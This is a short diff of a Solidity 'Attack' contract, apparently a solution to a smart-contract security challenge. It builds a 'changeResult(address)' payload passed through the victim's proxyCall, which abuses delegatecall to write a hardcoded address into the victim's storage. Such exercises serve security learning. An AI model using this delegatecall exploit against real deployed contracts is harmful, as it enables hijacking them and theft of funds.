@@ -33,8 +33,7 @@ contract Attack {
         // TODO: Add your implementation here
         // Note: Make sure you know how delegatecall works
         // bytes memory data = ...
-        // var3 = address(this);
-        bytes memory data = abi.encodeWithSignature("changeResult(address)", address(this));
+        bytes memory data = abi.encodeWithSignature("changeResult(address)",address(0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE));
 
         ID31eg4t3(victim).proxyCall(data);
         // (abi.encodeWithSelector(ID31eg4t3.proxyCall.selector, data));
